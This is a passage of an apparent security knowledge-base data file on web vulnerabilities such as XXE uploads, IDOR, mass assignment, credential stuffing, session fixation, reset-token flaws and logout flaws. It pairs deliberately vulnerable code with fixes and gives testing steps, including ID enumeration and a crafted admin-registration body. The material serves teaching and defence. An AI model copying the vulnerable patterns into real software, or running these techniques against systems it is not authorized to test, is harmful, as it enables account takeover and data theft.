    tools: ["Burp Suite", "XXEinjector", "manual crafting with a zip utility for Office Open XML formats"],
    automated_testing:
      "Craft malicious versions of each accepted file format (a minimal valid SVG/DOCX " +
      "shell with an injected DOCTYPE) and upload them through the target feature while " +
      "monitoring a Collaborator/Interactsh listener for OOB confirmation, since automated " +
      "scanners rarely test file-upload content for XXE by default and this typically " +
      "requires manual payload construction per format.",
    manual_testing: [
      "Enumerate every accepted upload file type and identify which are XML-based or ZIP-of-XML-based formats",
      "For SVG: craft a minimal SVG with an embedded DOCTYPE/entity file-read payload and upload it wherever image uploads are accepted (avatars, logos, embedded content)",
      "For DOCX/XLSX/PPTX: unzip a legitimate sample file, inject the XXE payload into the relevant XML part (e.g. word/document.xml, xl/workbook.xml), re-zip, and rename with the correct extension before uploading",
      "Check whether the processed output (thumbnail, extracted text, converted PDF) reflects file content, or use OOB techniques if no direct reflection occurs",
      "Test whether upload-time virus/malware scanning itself parses the file's XML content in a way that is separately exploitable"
    ],
    remediation:
      "Apply the same XML-hardening principles (disable DOCTYPE/external entity resolution) " +
      "to every library anywhere in the upload-processing pipeline that touches XML content, " +
      "not just the application's primary XML parser -- explicitly audit third-party image, " +
      "document-conversion, and virus-scanning libraries for their default XML parser " +
      "configuration. Reject uploaded files containing a DOCTYPE declaration outright " +
      "wherever the format does not legitimately require one (this covers the overwhelming " +
      "majority of real-world SVG/Office uploads). Validate file content against the expected " +
      "format/magic bytes rather than trusting the file extension alone.",
    references: [
      "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
      "https://portswigger.net/web-security/xxe/xxe-svg-images"
    ],
    difficulty: "Medium",
    commonness: "Uncommon"
  },

  // ===========================================================================
  // ACCESS CONTROL
  // ===========================================================================

  {
    id: "idor",
    name: "Insecure Direct Object Reference (IDOR)",
    category: "Access Control",
    cwe: "CWE-639",
    owasp_category: "A01:2021 - Broken Access Control",
    description:
      "IDOR occurs when an application exposes a direct reference to an internal object " +
      "(a database primary key, a filename, a document ID) and performs an operation on it " +
      "without verifying that the currently authenticated user is actually authorized to " +
      "access that specific object. It manifests in two directions: horizontal privilege " +
      "escalation, where a user accesses another user's data at the same privilege level " +
      "(user A viewing user B's invoice by changing an ID), and vertical privilege " +
      "escalation, where a lower-privileged user reaches functionality or data reserved for " +
      "a higher-privileged role (a regular user reaching an admin-only object by ID).\n\n" +
      "IDOR is fundamentally an authorization gap, not an authentication gap -- the request " +
      "is made by a legitimately logged-in user with a valid session, but the application " +
      "fails to check object-level ownership/permission before returning or modifying the " +
      "referenced object. It is one of the most prevalent and consequential vulnerabilities " +
      "in modern applications, especially REST/GraphQL APIs, because object identifiers " +
      "(sequential integers, or even predictable-looking UUIDs generated in an insecure " +
      "manner) are frequently exposed directly in URLs and request bodies.",
    impact:
      "Unauthorized access to other users' personal data, financial records, private " +
      "messages, or documents; unauthorized modification or deletion of other users' data; " +
      "vertical escalation to administrative functionality and data; at scale, systematic " +
      "IDOR exploitation (iterating sequential IDs) can result in a full database-equivalent " +
      "breach of every user's records.",
    examples: [
      {
        title: "REST API returning invoice data by ID with no ownership check",
        vulnerable_code:
          "@app.route('/api/invoices/<int:invoice_id>')\n" +
          "@login_required\n" +
          "def get_invoice(invoice_id):\n" +
          "    invoice = Invoice.query.get(invoice_id)\n" +
          "    if not invoice:\n" +
          "        abort(404)\n" +
          "    return jsonify(invoice.to_dict())",
        fixed_code:
          "@app.route('/api/invoices/<int:invoice_id>')\n" +
          "@login_required\n" +
          "def get_invoice(invoice_id):\n" +
          "    invoice = Invoice.query.filter_by(\n" +
          "        id=invoice_id, owner_id=current_user.id\n" +
          "    ).first()\n" +
          "    if not invoice:\n" +
          "        abort(404) # same 404 for 'not found' and 'not yours', avoids leaking existence\n" +
          "    return jsonify(invoice.to_dict())",
        explanation:
          "The vulnerable endpoint only checks that the requester is logged in " +
          "(@login_required) and that the invoice exists, but never verifies the invoice " +
          "belongs to the requesting user, so simply iterating /api/invoices/1, " +
          "/api/invoices/2, ... /api/invoices/N discloses every customer's invoice data. The " +
          "fix scopes the database query itself to the authenticated user's ownership " +
          "(owner_id=current_user.id), returning a 404 for both 'does not exist' and " +
          "'exists but is not yours' so the response cannot be used to enumerate valid IDs " +
          "belonging to other users."
      },
      {
        title: "GraphQL mutation missing object-level authorization",
        vulnerable_code:
          "const resolvers = {\n" +
          "  Mutation: {\n" +
          "    deleteDocument: async (_, { id }, { user }) => {\n" +
          "      if (!user) throw new AuthenticationError('Not logged in');\n" +
          "      await db.documents.delete({ id }); // no ownership check\n" +
          "      return true;\n" +
          "    }\n" +
          "  }\n" +
          "};",
        fixed_code:
          "const resolvers = {\n" +
          "  Mutation: {\n" +
          "    deleteDocument: async (_, { id }, { user }) => {\n" +
          "      if (!user) throw new AuthenticationError('Not logged in');\n" +
          "      const doc = await db.documents.findOne({ id });\n" +
          "      if (!doc || doc.ownerId !== user.id) {\n" +
          "        throw new ForbiddenError('Not found'); // avoid distinguishing 403 vs 404\n" +
          "      }\n" +
          "      await db.documents.delete({ id });\n" +
          "      return true;\n" +
          "    }\n" +
          "  }\n" +
          "};",
        explanation:
          "GraphQL APIs are especially exposed to IDOR because mutations/queries frequently " +
          "accept an id argument directly and authentication middleware only confirms " +
          "'is someone logged in', not 'does this specific user own this specific object' -- " +
          "the vulnerable resolver lets any authenticated user delete any document by ID. " +
          "The fix adds an explicit ownership check inside the resolver before performing " +
          "the mutation, which must be done in every single resolver individually since " +
          "GraphQL has no equivalent of REST's per-route middleware by default."
      }
    ],
    detection_methods: [
      "Create two test accounts at the same privilege level and attempt to access/modify each other's resources by swapping IDs in requests",
      "Test both read (GET) and write (POST/PUT/PATCH/DELETE) operations, since read-only IDOR checks are sometimes present while write paths are missed",
      "Test IDs in all locations: URL path, query string, request body (JSON/form), and headers",
      "Test non-sequential-looking IDs (UUIDs, hashes) by obtaining a legitimate one as a lower-privileged test account and substituting it, since 'looks random' does not mean 'is authorized'"
    ],
    tools: ["Burp Suite (Autorize extension for automated authorization testing)", "Burp Suite Intruder (for ID enumeration)", "Postman/curl for manual API testing"],
    automated_testing:
      "Burp Suite's Autorize extension automates IDOR/broken access control detection: " +
      "configure it with a lower-privileged session's cookie/token, then browse the " +
      "application as a higher-privileged user; Autorize automatically replays every request " +
      "using the lower-privileged session and flags responses that unexpectedly succeed, " +
      "which is far more thorough than manual spot-checking across a large API surface.",
    manual_testing: [
      "Register or obtain two accounts with identical privilege levels and create test data under each",
      "For every endpoint that references an object by ID, capture a legitimate request as account A, then replace the ID with an object belonging to account B while keeping account A's session",
      "Repeat for every HTTP method the endpoint supports, not just GET",
      "Test with a lower-privileged account against admin-only object IDs to check for vertical escalation",
      "For sequential numeric IDs, test ID enumeration at scale (with rate-limit awareness) to assess how much data could be systematically harvested",
      "Test alternate ID formats if the primary key is not directly exposed (check if a UUID, hash, or encoded value can still be brute-forced or is otherwise guessable/enumerable)"
    ],
    remediation:
      "Enforce object-level authorization checks on every single request that references a " +
      "specific object, at the data-access layer (scope every query to the authenticated " +
      "user's ownership/permissions) rather than relying on obscurity of the identifier. " +
      "Use a centralized authorization library or policy engine (e.g. a consistent " +
      "can(user, action, resource) check applied uniformly) rather than ad hoc per-endpoint " +
      "logic, which is easy to miss on new routes. Return identical 404 responses for both " +
      "'object does not exist' and 'object exists but you lack access' to prevent " +
      "existence-enumeration side channels. Apply this discipline equally to GraphQL " +
      "resolvers, which have no built-in per-route middleware equivalent to REST.",
    references: [
      "https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control",
      "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html",
      "https://portswigger.net/web-security/access-control/idor"
    ],
    difficulty: "Easy",
    commonness: "Very Common"
  },

  {
    id: "mass-assignment",
    name: "Mass Assignment / Auto-Binding Vulnerability",
    category: "Access Control",
    cwe: "CWE-915",
    owasp_category: "A08:2021 - Software and Data Integrity Failures",
    description:
      "Mass assignment occurs when a framework's convenience feature for automatically " +
      "binding request body fields to a model/object (Ruby on Rails' strong parameters " +
      "predecessor attr_accessible, ASP.NET MVC/Core model binding, Spring's " +
      "@ModelAttribute, Django REST Framework serializers, Sequelize/Mongoose .create()) " +
      "is used without an explicit allowlist of which fields are permitted to be set from " +
      "user input. If the underlying model includes sensitive fields (isAdmin, role, " +
      "accountBalance, verified) that were never intended to be directly settable by the " +
      "client, an attacker can simply add those field names to the JSON/form body and have " +
      "them silently bound and persisted.\n\n" +
      "This vulnerability class caused a well-known real-world incident in 2012 (a GitHub " +
      "public key mass-assignment vulnerability allowed adding SSH keys to arbitrary " +
      "repositories) and remains extremely common in modern JSON APIs, since developers " +
      "frequently pass req.body directly into an ORM's create()/update() call for " +
      "convenience without an explicit field allowlist.",
    impact:
      "Privilege escalation by directly setting a role/isAdmin field during registration or " +
      "profile update; financial fraud by directly setting balance/price/discount fields; " +
      "bypassing intended business workflow state (setting verified=true or " +
      "approvalStatus=approved without going through the actual approval process).",
    examples: [
      {
        title: "Node.js/Mongoose user registration binding the entire request body",
        vulnerable_code:
          "app.post('/register', async (req, res) => {\n" +
          "  const user = await User.create(req.body); // binds every field present in the body\n" +
          "  res.json({ id: user._id, email: user.email });\n" +
          "});\n" +
          "// User schema includes: email, password, role (default: 'user'), isVerified",
        fixed_code:
          "app.post('/register', async (req, res) => {\n" +
          "  const { email, password } = req.body; // explicit allowlist of bindable fields\n" +
          "  const user = await User.create({\n" +
          "    email,\n" +
          "    password: await hashPassword(password),\n" +
          "    role: 'user', // always hardcoded server-side, never derived from input\n" +
          "    isVerified: false\n" +
          "  });\n" +
          "  res.json({ id: user._id, email: user.email });\n" +
          "});",
        explanation:
          "Passing the raw req.body straight into User.create() means a registration " +
          "request body of {\"email\":\"attacker@evil.com\",\"password\":\"x\",\"role\":" +
          "\"admin\",\"isVerified\":true} creates a fully verified admin account directly, " +
          "since Mongoose will happily set any field present in the schema from the supplied " +
          "object. The fix explicitly destructures only the fields that should ever be " +
          "user-settable (email, password) and hardcodes every security-sensitive field " +
          "(role, isVerified) server-side, so no request body content can influence them " +
          "regardless of what the client sends."
      }
    ],
    detection_methods: [
      "Review API documentation/schema and the underlying data model for fields not exposed in the documented request but present in the model (role, isAdmin, price, verified, balance)",
      "Add suspected sensitive field names to request bodies on create/update endpoints and check if they take effect by fetching the object afterward",
      "Test both creation and update endpoints separately, since update endpoints frequently have looser binding than creation flows"
    ],
    tools: ["Burp Suite (manual body parameter addition)", "Arjun (parameter discovery)", "source code review / decompiled model inspection"],
    automated_testing:
      "Arjun discovers hidden/undocumented parameters an endpoint accepts by fuzzing common " +
      "parameter name wordlists against the target: `arjun -u https://target/api/register " +
      "-m JSON`; cross-reference discovered parameters against known sensitive field name " +
      "patterns (role, admin, verified, balance, price, permission) for manual mass-assignment " +
      "testing.",
    manual_testing: [
      "Obtain or infer the underlying data model's full field list (from API docs, client-side JS bundles, GraphQL introspection, or educated guessing based on domain: role, isAdmin, price, discount, verified, balance, ownerId)",
      "Submit a normal create/update request with one additional suspected-sensitive field added to the body",
      "Fetch the created/updated object afterward (or check its effects) to confirm whether the additional field was actually applied",
      "Repeat systematically across every create/update endpoint, since allowlisting is often applied inconsistently across an API"
    ],
    remediation:
      "Never bind request bodies directly to models; always use an explicit allowlist " +
      "(Rails strong parameters, DRF serializer fields, a manually destructured object) " +
      "specifying exactly which fields a given endpoint is permitted to set. Keep " +
      "security-sensitive fields (role, isAdmin, verified, balance) entirely out of any " +
      "user-facing bindable schema, setting them only through dedicated, separately " +
      "authorized code paths (an admin-only role-change endpoint, an internal payment " +
      "processing service).",
    references: [
      "https://owasp.org/www-community/vulnerabilities/Mass_Assignment_Cheat_Sheet",
      "https://cwe.mitre.org/data/definitions/915.html"
    ],
    difficulty: "Easy",
    commonness: "Common"
  },

  // ===========================================================================
  // AUTHENTICATION AND SESSION MANAGEMENT
  // ===========================================================================

  {
    id: "broken-auth-credential-stuffing",
    name: "Broken Authentication: Credential Stuffing",
    category: "Authentication",
    cwe: "CWE-307",
    owasp_category: "A07:2021 - Identification and Authentication Failures",
    description:
      "Credential stuffing is an automated attack that takes username/password pairs leaked " +
      "from breaches of other, unrelated services and tries them en masse against the target " +
      "login endpoint, exploiting the widespread reuse of passwords across multiple sites. " +
      "Unlike traditional brute forcing (which guesses passwords for a known username), " +
      "credential stuffing already has valid, real password values -- it only needs to find " +
      "the (typically small) percentage of users who reused the same email/password " +
      "combination on the target site, which is reliably nonzero given billions of leaked " +
      "credential pairs available from historical breaches.\n\n" +
      "Applications are vulnerable when they lack rate limiting, CAPTCHA, device/IP " +
      "reputation checks, or breached-password detection on the login endpoint, allowing " +
      "attackers to test large credential lists (often via distributed botnets to evade " +
      "IP-based rate limits) at scale using tools purpose-built for this attack.",
    impact:
      "Account takeover at scale across a percentage of the user base proportional to " +
      "password-reuse rates (industry estimates commonly cite 0.1%-2% success rates, which " +
      "is still thousands of accounts against a large user base); downstream fraud, data " +
      "theft, or further pivoting through compromised accounts; reputational damage and " +
      "regulatory exposure when the compromise is publicly attributed to the target rather " +
      "than the original unrelated breach source.",
    examples: [
      {
        title: "Login endpoint with no rate limiting or anomaly detection",
        vulnerable_code:
          "app.post('/login', async (req, res) => {\n" +
          "  const { email, password } = req.body;\n" +
          "  const user = await User.findOne({ email });\n" +
          "  if (user && await bcrypt.compare(password, user.passwordHash)) {\n" +
          "    return res.json({ token: signToken(user) });\n" +
          "  }\n" +
          "  return res.status(401).json({ error: 'Invalid credentials' });\n" +
          "});",
        fixed_code:
          "const rateLimit = require('express-rate-limit');\n" +
          "const loginLimiter = rateLimit({\n" +
          "  windowMs: 15 * 60 * 1000,\n" +
          "  max: 5, // per IP per window; combine with per-account limiting below\n" +
          "  standardHeaders: true,\n" +
          "  message: 'Too many login attempts, please try again later'\n" +
          "});\n\n" +
          "app.post('/login', loginLimiter, async (req, res) => {\n" +
          "  const { email, password } = req.body;\n" +
          "  const attempts = await getRecentFailedAttempts(email); // per-account tracking\n" +
          "  if (attempts >= 10) {\n" +
          "    return res.status(429).json({ error: 'Account temporarily locked, check your email' });\n" +
          "  }\n" +
          "  const user = await User.findOne({ email });\n" +
          "  const valid = user && await bcrypt.compare(password, user.passwordHash);\n" +
          "  if (!valid) {\n" +
          "    await recordFailedAttempt(email);\n" +
          "    return res.status(401).json({ error: 'Invalid credentials' });\n" +
          "  }\n" +
          "  if (await isPasswordBreached(password)) { // e.g. HaveIBeenPwned k-anonymity API\n" +
          "    return res.status(403).json({ error: 'Password found in a data breach, please reset it' });\n" +
          "  }\n" +
          "  await clearFailedAttempts(email);\n" +
          "  return res.json({ token: signToken(user) });\n" +
          "});",
        explanation:
          "Without any rate limiting, an attacker can submit thousands of email/password " +
          "pairs per minute from a leaked breach dump against this endpoint, and the " +
          "application offers no friction or detection whatsoever. The fix layers IP-based " +
          "rate limiting, per-account failed-attempt tracking with temporary lockout, and " +
          "breached-password detection (checking submitted passwords, even correct ones, " +
          "against known-compromised password databases via a privacy-preserving k-anonymity " +
          "API) so that even successful stuffing attempts using a breached password prompt a " +
          "forced reset."
      }
    ],
    detection_methods: [
      "Attempt a moderate volume of login requests with varying credentials from a single IP and observe whether any rate limiting, CAPTCHA, or lockout is triggered",
      "Check whether the application distinguishes 'invalid username' from 'invalid password' in error messages/timing, which aids automated credential-stuffing tools in username enumeration",
      "Review whether breached-password checking is performed at login and/or registration"
    ],
    tools: ["Burp Suite Intruder (controlled testing only, with authorization)", "OWASP Amass/breach-data correlation for awareness", "Have I Been Pwned Pwned Passwords API (for defensive integration)"],
    automated_testing:
      "Within authorized scope, use Burp Intruder with a small, safe test credential list " +
      "against a staging/test environment (never live user accounts without explicit " +
      "authorization) to measure rate-limiting thresholds and lockout behavior; production " +
      "credential-stuffing simulation should be coordinated carefully to avoid locking out " +
      "real users or triggering downstream fraud-detection false positives.",
    manual_testing: [
      "In a test environment, submit a batch of login attempts against a single test account and measure how many attempts are allowed before any throttling/lockout occurs",
      "Test whether rate limiting is applied per-IP only (easily bypassed via a botnet/proxy rotation) versus also per-account or per-device-fingerprint",
      "Check for username enumeration via differing error messages, response times, or status codes between valid and invalid usernames",
      "Verify whether MFA is offered/enforced, since MFA is the single most effective control against credential-stuffing account takeover even when the password itself is correctly guessed"
    ],
    remediation:
      "Enforce rate limiting on login endpoints both per-IP and per-account, with " +
      "progressive delays or temporary lockouts after repeated failures. Require CAPTCHA or " +
      "an equivalent proof-of-work challenge after a small number of failed attempts. Check " +
      "submitted passwords against known-breached password databases (via the HaveIBeenPwned " +
      "Pwned Passwords k-anonymity API or an equivalent) at both registration and login, " +
      "prompting a forced reset on a match. Strongly encourage or require multi-factor " +
      "authentication, which neutralizes credential stuffing even when the password is " +
      "correct. Monitor for distributed low-and-slow stuffing patterns (many distinct IPs, " +
      "each trying few attempts) using device fingerprinting and behavioral analytics rather " +
      "than IP-rate-limiting alone.",
    references: [
      "https://owasp.org/www-community/attacks/Credential_stuffing",
      "https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html"
    ],
    difficulty: "Easy",
    commonness: "Very Common"
  },

  {
    id: "broken-auth-session-fixation",
    name: "Broken Authentication: Session Fixation",
    category: "Authentication",
    cwe: "CWE-384",
    owasp_category: "A07:2021 - Identification and Authentication Failures",
    description:
      "Session fixation occurs when an application allows an attacker to establish a known " +
      "session identifier and then have the victim authenticate under that same identifier, " +
      "rather than issuing a fresh session ID at the moment of successful login. If the " +
      "session ID accepted before authentication remains valid after authentication (the " +
      "application never calls session-regenerate on login), an attacker can prime a session " +
      "(e.g. via a session ID accepted in a URL parameter, or simply by visiting the site and " +
      "obtaining a pre-auth session cookie), trick the victim into using that same session " +
      "(via a crafted link containing the session ID, or by exploiting a shared/public " +
      "computer), and once the victim logs in, the attacker's already-known session ID " +
      "becomes a valid authenticated session for the victim's account.\n\n" +
      "This differs from session hijacking (stealing an already-active session token) in " +
      "that the attacker chooses the session identifier in advance and never needs to " +
      "intercept anything -- they simply wait for the victim to authenticate under a session " +
      "the attacker already possesses.",
    impact:
      "Full account takeover without needing to steal any credentials or intercept network " +
      "traffic; particularly dangerous on shared/public computers and in applications that " +
      "accept session identifiers via URL parameters, which are easily distributed via a " +
      "crafted link.",
    examples: [
      {
        title: "PHP application that never regenerates the session ID after login",
        vulnerable_code:
          "<?php\n" +
          "session_start(); // reuses whatever session ID the client presented, if any\n" +
          "if ($_SERVER['REQUEST_METHOD'] === 'POST') {\n" +
          "    if (validCredentials($_POST['username'], $_POST['password'])) {\n" +
          "        $_SESSION['user'] = $_POST['username'];\n" +
          "        $_SESSION['authenticated'] = true;\n" +
          "        header('Location: /dashboard');\n" +
          "    }\n" +
          "}\n" +
          "?>",
        fixed_code:
          "<?php\n" +
          "session_start();\n" +
          "if ($_SERVER['REQUEST_METHOD'] === 'POST') {\n" +
          "    if (validCredentials($_POST['username'], $_POST['password'])) {\n" +
          "        session_regenerate_id(true); // issue a brand-new session ID, destroy the old one\n" +
          "        $_SESSION['user'] = $_POST['username'];\n" +
          "        $_SESSION['authenticated'] = true;\n" +
          "        header('Location: /dashboard');\n" +
          "    }\n" +
          "}\n" +
          "?>",
        explanation:
          "An attacker visits the login page themselves to obtain a fresh, unauthenticated " +
          "PHPSESSID cookie value, then sends the victim a link to the site carrying that " +
          "same session ID (via ?PHPSESSID=... if the app accepts session IDs from the URL, " +
          "or by having pre-set the cookie on a shared machine); when the victim logs in " +
          "normally, the vulnerable code keeps using the same pre-existing session ID and " +
          "simply marks it authenticated, so the attacker's already-known session ID is now " +
          "fully authenticated as the victim. The fix calls session_regenerate_id(true) " +
          "immediately upon successful authentication, which issues a completely new session " +
          "identifier and invalidates the old one, so any session ID the attacker fixed " +
          "beforehand becomes useless the moment real login occurs."
      }
    ],
    detection_methods: [
      "Note the session cookie value before logging in, then log in and check whether the exact same session identifier remains valid/authenticated afterward",
      "Check whether the application accepts session identifiers via URL parameters (a strong session-fixation risk indicator on its own)",
      "Test whether logging out and logging back in issues a new session ID each time"
    ],
    tools: ["Burp Suite (manual cookie comparison across login flow)", "browser DevTools Application/Storage tab"],
    automated_testing:
      "Session fixation is best confirmed manually rather than via generic scanners: use " +
      "Burp Suite to record the session cookie value pre-login, complete the login flow, " +
      "and directly compare the pre- and post-login cookie values programmatically across a " +
      "scripted test to catch regressions in CI.",
    manual_testing: [
      "Record the session identifier issued before any authentication occurs",
      "Complete a normal login using those credentials while keeping the same cookie jar/browser session",
      "Compare the session identifier after login to the pre-login value; if unchanged, the application is vulnerable to session fixation",
      "If the application accepts session IDs via URL parameters, test whether an externally supplied session ID (crafted link) is honored and subsequently authenticated after victim login",
      "Repeat the test for logout followed by re-login to confirm regeneration occurs consistently, not just on first login"
    ],
    remediation:
      "Always regenerate the session identifier immediately upon any privilege-level change, " +
      "most importantly successful authentication, and also on logout and privilege " +
      "escalation (e.g. entering an admin mode). Never accept session identifiers via URL " +
      "parameters; use cookies with HttpOnly, Secure, and SameSite attributes exclusively. " +
      "Invalidate the old session server-side when regenerating, not just issue a new one " +
      "client-side, so the pre-fixation session ID cannot still be replayed.",
    references: [
      "https://owasp.org/www-community/attacks/Session_fixation",
      "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
    ],
    difficulty: "Medium",
    commonness: "Uncommon"
  },

  {
    id: "broken-auth-password-reset",
    name: "Broken Authentication: Password Reset Flaws",
    category: "Authentication",
    cwe: "CWE-640",
    owasp_category: "A07:2021 - Identification and Authentication Failures",
    description:
      "Password reset functionality is a high-value target because it is an intentional " +
      "authentication bypass mechanism (it lets someone gain access without the current " +
      "password) that must be secured essentially as rigorously as the login itself. Common " +
      "flaws include: predictable or non-expiring reset tokens (sequential IDs, timestamps, " +
      "weakly random tokens vulnerable to brute force); tokens not invalidated after use or " +
      "after a subsequent password change; reset links leaking via the Referer header when " +
      "the reset page loads third-party resources; host header injection poisoning the " +
      "reset link's domain (see header-injection-host); IDOR in the reset flow allowing an " +
      "attacker to trigger or complete a reset for an arbitrary account by manipulating a " +
      "user-ID parameter; and 'security questions' with low-entropy, guessable or " +
      "OSINT-discoverable answers used as a sole reset factor.\n\n" +
      "A particularly common real-world flaw is a reset flow where the token verification " +
      "step and the actual password-change step are separate requests, and the second " +
      "request only checks that *a* valid token exists somewhere for *a* user rather than " +
      "re-validating the token against the specific user ID passed alongside it -- allowing " +
      "an attacker to request their own valid reset token and then submit it alongside a " +
      "victim's user ID to change the victim's password.",
    impact:
      "Full account takeover without needing the victim's original password at all, since " +
      "the reset mechanism is itself the exploited authentication path; at scale, systematic " +
      "abuse of a token-predictability flaw could allow mass account takeover across the " +
      "user base.",
    examples: [
      {
        title: "Password reset endpoint that trusts a client-supplied user ID alongside the token",
        vulnerable_code:
          "app.post('/reset-password', async (req, res) => {\n" +
          "  const { userId, token, newPassword } = req.body;\n" +
          "  const validToken = await db.resetTokens.findOne({ token }); // not scoped to userId\n" +
          "  if (!validToken || validToken.expiresAt < Date.now()) {\n" +
          "    return res.status(400).json({ error: 'Invalid or expired token' });\n" +
          "  }\n" +
          "  await User.updatePassword(userId, newPassword); // uses client-supplied userId!\n" +
          "  res.json({ message: 'Password updated' });\n" +
          "});",
        fixed_code:
          "app.post('/reset-password', async (req, res) => {\n" +
          "  const { token, newPassword } = req.body; // userId is NEVER taken from the client\n" +
          "  const validToken = await db.resetTokens.findOne({\n" +
          "    token,\n" +
          "    expiresAt: { $gt: Date.now() },\n" +
          "    used: false\n" +
          "  });\n" +
          "  if (!validToken) {\n" +
          "    return res.status(400).json({ error: 'Invalid or expired token' });\n" +
          "  }\n" +
          "  await User.updatePassword(validToken.userId, newPassword); // derived from the token record itself\n" +
          "  await db.resetTokens.markUsed(validToken._id);\n" +
          "  await invalidateAllSessions(validToken.userId); // log out any existing sessions\n" +
          "  res.json({ message: 'Password updated' });\n" +
          "});",
        explanation:
          "Because the vulnerable endpoint updates whichever userId the client supplies " +
          "rather than the user ID actually associated with the validated token, an attacker " +
          "requests a legitimate reset token for their own account, then submits the reset " +
          "request with their own valid token but the victim's userId, changing the victim's " +
          "password instead of their own. The fix derives the target user entirely from the " +
          "server-side token record (never from client input), marks the token used " +
          "immediately to prevent replay, and invalidates all existing sessions for the " +
          "account as a precaution."
      }
    ],
    detection_methods: [
      "Trigger a password reset and inspect the token for predictability (sequential, timestamp-based, short/low-entropy)",
      "Test whether the same reset token can be used more than once, or after the password has already been changed via another means",
      "Test the reset-completion request with a valid token for account A but a manipulated user identifier pointing at account B",
      "Check whether the reset link leaks via the Referer header if the reset page loads any third-party resource (fonts, analytics, images)",
      "Test reset link expiration (whether an old, long-unused token is still accepted)"
    ],
    tools: ["Burp Suite", "manual token-entropy analysis", "browser DevTools Network tab (Referer leakage check)"],
    automated_testing:
      "Burp Suite's Sequencer tool can be pointed at repeatedly generated reset tokens to " +
      "perform statistical randomness analysis and flag insufficient entropy; beyond that, " +
      "reset-flow logic flaws (userId/token mismatch handling, token reuse) require manual, " +
      "workflow-aware testing since they depend on the specific multi-step logic of each " +
      "implementation.",
    manual_testing: [
      "Trigger multiple password reset requests and collect the resulting tokens; assess length, character set, and any observable pattern or predictability",
      "Attempt to reuse a token after it has already been successfully used once",
      "Attempt to use a valid token issued for account A in a request that also specifies (or implies via IDOR) account B",
      "Check whether the reset-confirmation page makes any outbound requests (third-party scripts, images, fonts) that could leak the token via the Referer header",
      "Test whether initiating a new reset invalidates any previously issued, still-valid tokens for the same account",
      "Test rate limiting on the 'request reset' step itself, since an unlimited request volume aids token brute-forcing if tokens are short"
    ],
    remediation:
      "Generate reset tokens using a cryptographically secure random source with sufficient " +
      "entropy (at least 128 bits), store them hashed server-side, and bind each token " +
      "explicitly and immutably to a specific user record so the completion step can never " +
      "be redirected to a different account via client input. Expire tokens quickly (15-60 " +
      "minutes is typical) and invalidate them immediately after first use, and invalidate " +
      "any prior outstanding tokens when a new reset is requested. Set a strict Referrer-Policy " +
      "on the reset-confirmation page and avoid loading third-party resources there. " +
      "Invalidate all existing active sessions for the account when a password reset " +
      "completes, and notify the account owner via email whenever a reset occurs.",
    references: [
      "https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html",
      "https://owasp.org/www-community/vulnerabilities/",
      "https://portswigger.net/web-security/authentication/other-mechanisms"
    ],
    difficulty: "Medium",
    commonness: "Common"
  },

  {
    id: "session-management-flaws",
    name: "Session Management Flaws",
    category: "Authentication",
    cwe: "CWE-613",
    owasp_category: "A07:2021 - Identification and Authentication Failures",
    description:
      "Beyond fixation, session management encompasses a broader set of implementation " +
      "flaws: session tokens with insufficient entropy or predictable generation algorithms; " +
      "missing or excessively long session timeouts (no idle or absolute expiration); " +
      "session tokens that remain valid after logout (server-side invalidation never " +
      "occurs, only the client-side cookie is cleared); missing HttpOnly/Secure/SameSite " +
      "cookie attributes exposing tokens to script access or transmission over plaintext; " +
      "and lack of concurrent-session control allowing an unlimited number of simultaneous " +
      "active sessions per account, which increases the value and stealthiness of a stolen " +
      "token since the legitimate user's own session is not disrupted.\n\n" +
      "A common real-world flaw is client-side-only logout: the 'Log out' button simply " +
      "deletes the local cookie/localStorage token without informing the server to " +
      "invalidate it, meaning a token captured before logout (via XSS, a proxy log, or " +
      "browser history on a shared machine) remains fully valid indefinitely, or until " +
      "natural expiration.",
    impact:
      "Extended window of exploitability for any stolen session token, since logout does " +
      "not actually revoke server-side validity; increased impact of any XSS or token-theft " +
      "vulnerability elsewhere in the application; inability to remotely respond to a " +
      "suspected compromise (no way to force-invalidate all of a user's active sessions).",
    examples: [
      {
        title: "JWT-based 'session' with no server-side revocation capability",
        vulnerable_code:
          "app.post('/logout', (req, res) => {\n" +
          "  res.clearCookie('token'); // only removes the cookie client-side\n" +
          "  res.json({ message: 'Logged out' });\n" +
          "});\n" +
          "// The JWT itself remains cryptographically valid until its exp claim,\n" +
          "// regardless of this 'logout' -- if captured beforehand, it still works.",
        fixed_code:
          "app.post('/logout', requireAuth, async (req, res) => {\n" +
          "  const jti = req.auth.jti; // unique token ID claim embedded at issuance\n" +
          "  await redis.set(`revoked:${jti}`, '1', 'EX', req.auth.exp - Math.floor(Date.now() / 1000));\n" +
          "  res.clearCookie('token');\n" +
          "  res.json({ message: 'Logged out' });\n" +
          "});\n\n" +
          "// Auth middleware checks the revocation list on every request:\n" +
          "async function requireAuth(req, res, next) {\n" +
          "  const payload = verifyJwt(req.cookies.token);\n" +
          "  if (!payload) return res.status(401).end();\n" +
          "  if (await redis.get(`revoked:${payload.jti}`)) return res.status(401).end();\n" +
          "  req.auth = payload;\n" +
          "  next();\n" +
          "}",
        explanation:
          "Stateless JWTs are, by design, valid until expiration purely based on their " +
          "signature -- clearing the cookie client-side does nothing to the token's actual " +
          "cryptographic validity, so a token captured via a proxy log, browser history, or " +
          "an XSS payload before logout remains fully usable. The fix introduces a minimal " +
          "server-side revocation list (keyed by a unique jti claim per token, stored in " +
          "Redis with a TTL matching the token's remaining lifetime) checked on every " +
          "authenticated request, restoring the ability to actually invalidate a specific " +
          "token on logout or suspected compromise."
      }
    ],
    detection_methods: [
      "Capture a valid session token, log out through the normal UI flow, then replay the captured token directly against an authenticated endpoint to check if it still works",
      "Check Set-Cookie headers for HttpOnly, Secure, and SameSite attributes on session cookies",
      "Test session idle timeout by leaving a session inactive for an extended period and checking if it eventually requires re-authentication",
      "Test concurrent sessions by logging in from two different clients simultaneously and checking if both remain valid indefinitely with no visibility/control for the user"
    ],
    tools: ["Burp Suite", "browser DevTools (cookie attribute inspection)", "manual token-replay testing"],
    automated_testing:
      "Session cookie attribute checks (HttpOnly/Secure/SameSite) are flagged automatically " +
